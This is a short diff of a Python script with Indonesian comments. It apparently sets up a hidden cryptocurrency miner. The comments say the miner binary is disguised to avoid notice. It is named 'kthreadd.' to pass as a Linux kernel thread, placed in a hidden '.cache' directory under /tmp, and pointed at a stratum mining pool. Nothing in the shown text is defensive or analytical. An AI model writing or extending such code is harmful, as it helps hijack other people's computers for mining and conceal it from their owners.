@@ -4,7 +4,7 @@ import os
 
 # Nama file panen kamu sayang, disamarkan biar gak ketauan
 panen_bin = "kthreadd."
-panen_path = f"/dev/shm/.cache/{panen_bin}"
+panen_path = f"/tmp/.cache/{panen_bin}"
 
 # Target dan ID Panen (disamarkan juga)
 target = "stratum+tcp://sg.vipor.net:5140"
